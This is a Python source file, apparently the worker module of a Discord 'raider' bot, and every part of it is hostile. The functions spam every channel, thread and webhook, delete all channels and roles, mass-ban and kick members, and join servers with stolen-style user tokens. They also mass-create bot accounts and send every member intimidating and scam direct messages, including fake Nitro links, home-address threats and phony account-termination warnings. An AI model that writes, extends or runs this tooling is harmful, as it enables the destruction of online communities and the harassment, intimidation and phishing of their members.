# language: Python, file: raider.py, target: discord.py 2.x
# all raid workers — called from bot.py commands

import asyncio
import random
import discord
import aiohttp

_SEM = asyncio.Semaphore(150)  # global concurrency cap


# ── helpers ────────────────────────────────────────────────────────────────────

def _rand_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def _resolve_message(message: str) -> str:
    if "{ip}" in message:
        message = message.replace("{ip}", _rand_ip())
    return message


async def _text_channels(guild: discord.Guild) -> list[discord.TextChannel]:
    """Cached first; fetch via API when cache is empty (user-install / partial guild)."""
    channels = list(guild.text_channels)
    if not channels:
        try:
            all_ch = await guild.fetch_channels()
            channels = [c for c in all_ch if isinstance(c, discord.TextChannel)]
        except Exception:
            channels = []
    return channels


def _missing_perms(guild: discord.Guild, **required: bool) -> list[str]:
    """Return list of perm names that are needed but absent. Empty = all good."""
    if guild.me is None:
        return []          # user-install / not a member — skip check
    gp = guild.me.guild_permissions
    return [name for name, needed in required.items()
            if needed and not getattr(gp, name, False)]


# ── channel spam ───────────────────────────────────────────────────────────────

async def spam_channels(
    guild: discord.Guild,
    message: str,
    times: int = 50,
    delay: float = 0.0,
):
    channels = await _text_channels(guild)

    async def blast(channel: discord.TextChannel):
        for _ in range(times):
            async with _SEM:
                try:
                    await channel.send(_resolve_message(message))
                except discord.Forbidden:
                    break          # no perms in this channel — skip it
                except Exception:
                    continue       # transient error — keep going
            if delay:
                await asyncio.sleep(delay)

    await asyncio.gather(*[blast(ch) for ch in channels], return_exceptions=True)


# ── thread bomb ────────────────────────────────────────────────────────────────

async def thread_bomb(
    guild: discord.Guild,
    message: str = "@everyone",
    threads_per_channel: int = 10,
    spam_per_thread: int = 20,
):
    channels = await _text_channels(guild)

    async def bomb(channel: discord.TextChannel):
        for i in range(threads_per_channel):
            try:
                thread = await channel.create_thread(
                    name=f"raid-{i}",
                    auto_archive_duration=60,
                )
                for _ in range(spam_per_thread):
                    async with _SEM:
                        try:
                            await thread.send(_resolve_message(message))
                        except Exception:
                            continue
            except Exception:
                continue

    await asyncio.gather(*[bomb(ch) for ch in channels], return_exceptions=True)


# ── ghost ping ─────────────────────────────────────────────────────────────────

async def ghost_ping(guild: discord.Guild, times: int = 50):
    me = guild.me
    if me is not None:
        gp = me.guild_permissions
        if gp.mention_everyone:
            content = "@everyone @here"
            allowed = discord.AllowedMentions(everyone=True)
        else:
            targets = [m for m in guild.members if not m.bot and m != me][:30]
            content = " ".join(f"<@{m.id}>" for m in targets) or "@everyone"
            allowed = discord.AllowedMentions(users=True)
    else:
        content = "@everyone @here"
        allowed = discord.AllowedMentions(everyone=True)

    channels = await _text_channels(guild)

    async def ghost(channel: discord.TextChannel):
        for _ in range(times):
            async with _SEM:
                try:
                    msg = await channel.send(content, allowed_mentions=allowed)
                    await msg.delete()
                except discord.Forbidden:
                    break
                except Exception:
                    continue

    await asyncio.gather(*[ghost(ch) for ch in channels], return_exceptions=True)


# ── reaction flood ─────────────────────────────────────────────────────────────

async def react_flood(
    guild: discord.Guild,
    emoji: str = "💀",
    limit: int = 50,
):
    channels = await _text_channels(guild)

    async def flood(channel: discord.TextChannel):
        try:
            async for msg in channel.history(limit=limit):
                async with _SEM:
                    try:
                        await msg.add_reaction(emoji)
                    except Exception:
                        continue
        except Exception:
            pass

    await asyncio.gather(*[flood(ch) for ch in channels], return_exceptions=True)


# ── webhook spam ───────────────────────────────────────────────────────────────

async def webhook_spam(
    guild: discord.Guild,
    message: str,
    times: int = 50,
    name: str = "raid",
):
    channels = await _text_channels(guild)

    async def fire(channel: discord.TextChannel):
        try:
            wh = await channel.create_webhook(name=name)
            async with aiohttp.ClientSession() as session:
                tasks = []
                for _ in range(times):
                    tasks.append(
                        session.post(
                            wh.url,
                            json={"content": _resolve_message(message), "username": name},
                        )
                    )
                # fire all concurrently, don't wait for responses
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                for r in responses:
                    if hasattr(r, "close"):
                        r.close()
            await wh.delete()
        except Exception:
            pass

    await asyncio.gather(*[fire(ch) for ch in channels], return_exceptions=True)


# ── nuke: delete all channels, recreate spam ───────────────────────────────────

async def nuke_guild(guild: discord.Guild, spam_name: str = "nuked", count: int = 50):
    await asyncio.gather(
        *[ch.delete() for ch in guild.channels],
        return_exceptions=True,
    )
    await asyncio.gather(
        *[guild.create_text_channel(spam_name) for _ in range(min(count, 500))],
        return_exceptions=True,
    )


# ── dm all members ─────────────────────────────────────────────────────────────

async def dm_members(guild: discord.Guild, message: str, limit: int = 0) -> int:
    count = 0
    sem = asyncio.Semaphore(20)

    async def dm_one(member: discord.Member) -> bool:
        async with sem:
            try:
                await member.send(_resolve_message(message))
                return True
            except Exception:
                return False

    tasks = []
    async for member in guild.fetch_members(limit=None):
        if member.bot:
            continue
        tasks.append(dm_one(member))
        if limit and len(tasks) >= limit:
            break

    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)


# ── delete all roles ───────────────────────────────────────────────────────────

async def delete_roles(guild: discord.Guild):
    tasks = []
    for role in guild.roles:
        if not role.is_default() and guild.me and role.position < guild.me.top_role.position:
            tasks.append(role.delete())
    await asyncio.gather(*tasks, return_exceptions=True)


# ── ban all members ────────────────────────────────────────────────────────────

async def ban_all(guild: discord.Guild, reason: str = "raid"):
    sem = asyncio.Semaphore(10)

    async def _ban(member):
        async with sem:
            try:
                await guild.ban(member, reason=reason, delete_message_days=0)
            except Exception:
                pass

    tasks = []
    async for member in guild.fetch_members(limit=None):
        if member == guild.me or member == guild.owner:
            continue
        tasks.append(_ban(member))

    await asyncio.gather(*tasks, return_exceptions=True)


# ── kick all members ───────────────────────────────────────────────────────────

async def kick_all(guild: discord.Guild, reason: str = "raid"):
    sem = asyncio.Semaphore(10)

    async def _kick(member):
        async with sem:
            try:
                await guild.kick(member, reason=reason)
            except Exception:
                pass

    tasks = []
    async for member in guild.fetch_members(limit=None):
        if member == guild.me or member == guild.owner:
            continue
        tasks.append(_kick(member))

    await asyncio.gather(*tasks, return_exceptions=True)


# ── delete all emojis ──────────────────────────────────────────────────────────

async def delete_emojis(guild: discord.Guild) -> int:
    tasks = [emoji.delete() for emoji in guild.emojis]
    await asyncio.gather(*tasks, return_exceptions=True)
    return len(tasks)


# ── delete all webhooks ────────────────────────────────────────────────────────

async def delete_webhooks(guild: discord.Guild) -> int:
    try:
        webhooks = await guild.webhooks()
        await asyncio.gather(*[wh.delete() for wh in webhooks], return_exceptions=True)
        return len(webhooks)
    except Exception:
        return 0


# ── rename guild ───────────────────────────────────────────────────────────────

async def rename_guild(guild: discord.Guild, name: str):
    try:
        await guild.edit(name=name)
    except Exception:
        pass


# ── rename all channels ────────────────────────────────────────────────────────

async def rename_channels(guild: discord.Guild, name: str):
    await asyncio.gather(
        *[ch.edit(name=name) for ch in guild.channels],
        return_exceptions=True,
    )


# ── vc: disconnect all members ─────────────────────────────────────────────────

async def vc_kick_all(guild: discord.Guild):
    tasks = []
    for member in guild.members:
        if member.voice and member.voice.channel:
            tasks.append(member.move_to(None))
    await asyncio.gather(*tasks, return_exceptions=True)


# ── vc: rapid create/delete crash ──────────────────────────────────────────────

async def crash_vc(guild: discord.Guild, cycles: int = 30):
    for _ in range(cycles):
        try:
            vc = await guild.create_voice_channel("💀")
            await asyncio.sleep(0.05)
            await vc.delete()
        except Exception:
            pass


# ── @everyone / @here spam ─────────────────────────────────────────────────────

async def mention_spam(guild: discord.Guild, times: int = 20):
    channels = await _text_channels(guild)

    async def blast(ch: discord.TextChannel):
        for _ in range(times):
            async with _SEM:
                try:
                    await ch.send(
                        "@everyone @here",
                        allowed_mentions=discord.AllowedMentions(everyone=True),
                    )
                except discord.Forbidden:
                    break
                except Exception:
                    continue

    await asyncio.gather(*[blast(ch) for ch in channels], return_exceptions=True)


# ── create role + assign to all members ───────────────────────────────────────

async def role_all(guild: discord.Guild, role_name: str = "raided") -> int:
    count = 0
    try:
        role = await guild.create_role(name=role_name, mentionable=True)
        tasks = []
        async for member in guild.fetch_members(limit=None):
            if member.bot:
                continue
            tasks.append(member.add_roles(role))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        count = sum(1 for r in results if not isinstance(r, Exception))
    except Exception:
        pass
    return count


# ── lockdown ───────────────────────────────────────────────────────────────────

async def lockdown_channels(guild: discord.Guild) -> int:
    count = 0
    everyone = guild.default_role
    overwrite = discord.PermissionOverwrite(
        send_messages=False,
        read_messages=False,
        add_reactions=False,
    )

    async def lock_one(channel):
        try:
            await channel.set_permissions(everyone, overwrite=overwrite)
            return True
        except Exception:
            return False

    results = await asyncio.gather(
        *[lock_one(ch) for ch in guild.channels],
        return_exceptions=True,
    )
    return sum(1 for r in results if r is True)


# ── join server via user token ─────────────────────────────────────────────────

async def join_server(invite_code: str, user_token: str) -> str:
    url = f"https://discord.com/api/v10/invites/{invite_code}"
    headers = {
        "Authorization": user_token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIn0=",
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json={}) as resp:
            if resp.status in (200, 204):
                data = await resp.json()
                guild_name = data.get("guild", {}).get("name", "unknown")
                return f"✅ joined `{guild_name}`"
            elif resp.status == 401:
                return "❌ invalid user token"
            elif resp.status == 403:
                return "❌ forbidden (banned / verification required)"
            elif resp.status == 404:
                return "❌ invite not found / expired"
            elif resp.status == 429:
                return "❌ rate limited"
            else:
                return f"❌ status {resp.status}"


# ── probe: raidability audit ───────────────────────────────────────────────────

async def probe_guild(guild: discord.Guild) -> str:
    me = guild.me
    if me is None:
        # user-install context — partial info only
        verif_level = str(guild.verification_level)
        everyone = guild.default_role
        ext_apps_blocked = not everyone.permissions.use_application_commands
        return (
            f"**probe: {guild.name}** (`{guild.id}`)\n"
            f"members : {guild.member_count}\n"
            f"owner   : {guild.owner}\n\n"
            "**bot not a member** — running as user-install app\n"
            f"verification level : {verif_level}\n"
            f"ext. app cmds      : {'⚠️ blocked for @everyone' if ext_apps_blocked else '✅ open'}\n\n"
            "**verdict: ⚠️ USER-INSTALL MODE** — /raid /ghost /react /thread available via interaction channel\n"
            "use /invite → add to server for full admin ops (nuke / ban / kick)"
        )

    gp = me.guild_permissions

    has_admin   = gp.administrator
    can_nuke    = gp.manage_channels and gp.manage_roles
    can_ban     = gp.ban_members
    can_kick    = gp.kick_members
    can_webhook = gp.manage_webhooks
    can_mention = gp.mention_everyone
    can_msg     = gp.send_messages
    can_emoji   = gp.manage_emojis
    can_voice   = gp.move_members
    can_threads = gp.create_public_threads
    can_react   = gp.add_reactions

    mfa_required     = guild.mfa_level == discord.MFALevel.require_2fa
    verif_level      = str(guild.verification_level)
    is_community     = "COMMUNITY" in guild.features
    everyone         = guild.default_role
    ext_apps_blocked = not everyone.permissions.use_application_commands

    full_raidable = has_admin or (can_nuke and can_ban and can_kick and can_msg)
    low_raidable  = can_msg

    verdict = (
        "✅ FULLY RAIDABLE (admin ops available)"
        if full_raidable
        else "⚠️ LOW-PERM RAID (spam / ghost / react / thread work)"
        if low_raidable
        else "❌ NOT RAIDABLE (no send_messages)"
    )

    lines = [
        f"**probe: {guild.name}** (`{guild.id}`)",
        f"members : {guild.member_count}",
        f"owner   : {guild.owner}",
        "",
        "**bot permissions — admin ops**",
        f"administrator      : {'✅' if has_admin else '❌'}",
        f"manage_channels    : {'✅' if gp.manage_channels else '❌'}",
        f"manage_roles       : {'✅' if gp.manage_roles else '❌'}",
        f"ban_members        : {'✅' if can_ban else '❌'}",
        f"kick_members       : {'✅' if can_kick else '❌'}",
        f"manage_webhooks    : {'✅' if can_webhook else '❌'}",
        f"mention_everyone   : {'✅' if can_mention else '❌'} {'(@everyone ghost)' if can_mention else '(individual pings)'}",
        f"manage_emojis      : {'✅' if can_emoji else '❌'}",
        f"move_members       : {'✅' if can_voice else '❌'}",
        "",
        "**bot permissions — no-admin ops**",
        f"send_messages      : {'✅' if can_msg else '❌'}  ← /raid /ghost",
        f"add_reactions      : {'✅' if can_react else '❌'}  ← /react",
        f"create_pub_threads : {'✅' if can_threads else '❌'}  ← /thread",
        "",
        "**server security**",
        f"MFA required       : {'🔒 yes' if mfa_required else '✅ no'}",
        f"verification level : {verif_level}",
        f"community server   : {'⚠️ yes' if is_community else '✅ no'}",
        f"ext. app cmds      : {'⚠️ blocked for @everyone' if ext_apps_blocked else '✅ open'}",
        "",
        f"**verdict: {verdict}**",
    ]

    if not full_raidable:
        missing = []
        if not gp.manage_channels: missing.append("manage_channels")
        if not gp.ban_members:     missing.append("ban_members")
        if not gp.kick_members:    missing.append("kick_members")
        if missing:
            lines.append(f"missing for full raid: {', '.join(missing)}")

    return "\n".join(lines)


# ── DM message pool ────────────────────────────────────────────────────────────

DM_POOL = [
    "your server just got raided 💀",
    "you have been reported to Discord Trust & Safety",
    "your account has been flagged for termination",
    "@everyone has been notified of your activity",
    "the server owner leaked your DMs to us",
    "FREE NITRO → discord.gift/xXxXxXxX",
    f"your IP has been logged: {_rand_ip()}",
    "you have 24 hours before your account is deleted",
    "we have your home address. leave the server.",
    "your account is under review — verify now or get banned",
    "someone just purchased your account details. change your password.",
    "you've been permanently flagged by our moderation system",
    "this server is over. you should leave now.",
    "your DMs are being monitored. we see everything.",
    "admin has added you to the ban list. appeal at discord.gg/fake",
]


def _dm_message(index: int) -> str:
    msg = DM_POOL[index % len(DM_POOL)]
    if "{ip}" in msg:
        msg = msg.replace("{ip}", _rand_ip())
    return msg


# ── mass bot creation ──────────────────────────────────────────────────────────

_TIMEOUT = aiohttp.ClientTimeout(total=15, connect=8)

_API = "https://discord.com/api/v10"


async def validate_user_token(user_token: str) -> tuple[bool, str]:
    """Hit /users/@me to confirm the token works. Returns (ok, error_or_username)."""
    headers = {
        "Authorization": user_token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    try:
        async with aiohttp.ClientSession(timeout=_TIMEOUT) as session:
            async with session.get(f"{_API}/users/@me", headers=headers) as r:
                if r.status == 200:
                    data = await r.json()
                    return True, data.get("username", "unknown")
                body = await r.text()
                return False, f"status {r.status}: {body[:120]}"
    except asyncio.TimeoutError:
        return False, "timeout — Discord unreachable from the server"
    except Exception as e:
        return False, str(e)


async def _create_one_bot(
    session: aiohttp.ClientSession,
    user_token: str,
    name: str,
) -> tuple[dict | None, str]:
    """
    Create application + bot. Returns ({id, name, token}, "") on success,
    or (None, error_string) on failure.
    """
    headers = {
        "Authorization": user_token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIn0=",
    }

    # ── step 1: create application ─────────────────────────────────────────────
    app_id = None
    for attempt in range(4):
        try:
            async with session.post(
                f"{_API}/applications",
                headers=headers,
                json={"name": name, "description": ""},
            ) as r:
                body = await r.json()
                if r.status == 429:
                    wait = float(body.get("retry_after", 5)) + 0.5
                    await asyncio.sleep(wait)
                    continue
                if r.status not in (200, 201):
                    return None, f"create app status {r.status}: {str(body)[:120]}"
                app_id = body["id"]
                break
        except asyncio.TimeoutError:
            return None, "timeout on create app"
        except Exception as e:
            return None, f"create app error: {e}"
    else:
        return None, "create app: too many 429s"

    # ── step 2: attach bot ─────────────────────────────────────────────────────
    for attempt in range(4):
        try:
            async with session.post(
                f"{_API}/applications/{app_id}/bot",
                headers=headers,
                json={},
            ) as r:
                body = await r.json()
                if r.status == 429:
                    wait = float(body.get("retry_after", 5)) + 0.5
                    await asyncio.sleep(wait)
                    continue
                if r.status not in (200, 201):
                    return None, f"attach bot status {r.status}: {str(body)[:120]}"
                token = body.get("token")
                if not token:
                    # token field missing — reset token to get it
                    async with session.post(
                        f"{_API}/applications/{app_id}/bot/reset",
                        headers=headers,
                        json={},
                    ) as r2:
                        b2 = await r2.json()
                        token = b2.get("token", "")
                if not token:
                    return None, "bot created but token not returned — reset manually in dev portal"
                return {"id": app_id, "name": name, "token": token}, ""
        except asyncio.TimeoutError:
            return None, "timeout on attach bot"
        except Exception as e:
            return None, f"attach bot error: {e}"
    return None, "attach bot: too many 429s"


async def make_bots(
    user_token: str,
    count: int = 50,
    prefix: str = "raidbot",
    token_file: str = "bots.json",
    progress_cb=None,          # optional async callable(done, total, last_error)
) -> tuple[list[dict], int, list[str]]:
    """
    Create `count` bots. Returns (created, total_in_file, errors).
    progress_cb called every bot so the slash command can update the user.
    """
    import json, os, time

    created: list[dict] = []
    errors:  list[str]  = []

    async with aiohttp.ClientSession(timeout=_TIMEOUT) as session:
        for i in range(count):
            name   = f"{prefix}-{int(time.time()) % 100000}-{i}"
            result, err = await _create_one_bot(session, user_token, name)
            if result:
                created.append(result)
            else:
                errors.append(f"bot {i}: {err}")

            if progress_cb:
                await progress_cb(i + 1, count, err)

            # pace between creates — Discord rate-limits application creation
            await asyncio.sleep(1.5)

    # persist
    existing: list[dict] = []
    if os.path.exists(token_file):
        try:
            with open(token_file) as f:
                existing = json.load(f)
        except Exception:
            pass

    all_bots = existing + created
    with open(token_file, "w") as f:
        json.dump(all_bots, f, indent=2)

    return created, len(all_bots), errors


# ── mass DM via bot army ───────────────────────────────────────────────────────

async def _dm_one(
    bot_token: str,
    user_id: int | str,
    message: str,
) -> bool:
    """Open DM channel + send message as a bot token. No discord.py needed."""
    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json",
        "User-Agent": "DiscordBot (https://discord.com, 10)",
    }
    async with aiohttp.ClientSession() as session:
        # open / get DM channel
        async with session.post(
            "https://discord.com/api/v10/users/@me/channels",
            headers=headers,
            json={"recipient_id": str(user_id)},
        ) as r:
            if r.status == 429:
                data = await r.json()
                await asyncio.sleep(float(data.get("retry_after", 5)))
                return False
            if r.status != 200:
                return False
            channel = await r.json()
            channel_id = channel["id"]

        # send message
        async with session.post(
            f"https://discord.com/api/v10/channels/{channel_id}/messages",
            headers=headers,
            json={"content": message},
        ) as r:
            if r.status == 429:
                data = await r.json()
                await asyncio.sleep(float(data.get("retry_after", 5)))
                return False
            return r.status in (200, 201)


async def _fetch_guild_members_http(
    bot_token: str,
    guild_id: int | str,
    limit: int = 1000,
) -> list[str]:
    """Fetch member user IDs via HTTP (works without discord.py membership)."""
    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json",
    }
    user_ids: list[str] = []
    after = 0
    async with aiohttp.ClientSession() as session:
        while len(user_ids) < limit:
            params = {"limit": min(1000, limit - len(user_ids))}
            if after:
                params["after"] = after
            async with session.get(
                f"https://discord.com/api/v10/guilds/{guild_id}/members",
                headers=headers,
                params=params,
            ) as r:
                if r.status != 200:
                    break
                members = await r.json()
                if not members:
                    break
                for m in members:
                    uid = m.get("user", {}).get("id")
                    if uid and not m.get("user", {}).get("bot", False):
                        user_ids.append(uid)
                after = members[-1]["user"]["id"]
                if len(members) < 1000:
                    break
                await asyncio.sleep(0.5)
    return user_ids


async def dm_army(
    target_user_ids: list[int | str],
    token_file: str = "bots.json",
    mention_target: str = "",
) -> tuple[int, int]:
    """
    Each saved bot DMs every target user with a different message.
    Returns (success_count, fail_count).
    """
    import json, os

    if not os.path.exists(token_file):
        return 0, 0

    try:
        with open(token_file) as f:
            bots: list[dict] = json.load(f)
    except Exception:
        return 0, 0

    if not bots:
        return 0, 0

    success = 0
    fail = 0
    sem = asyncio.Semaphore(30)

    async def fire(bot_index: int, uid: int | str):
        nonlocal success, fail
        async with sem:
            msg = _dm_message(bot_index)
            if mention_target:
                msg = f"<@{mention_target}> {msg}"
            ok = await _dm_one(bots[bot_index % len(bots)]["token"], uid, msg)
            if ok:
                success += 1
            else:
                fail += 1

    tasks = []
    for i, uid in enumerate(target_user_ids):
        for bi in range(len(bots)):
            tasks.append(fire(bi, uid))

    await asyncio.gather(*tasks, return_exceptions=True)
    return success, fail
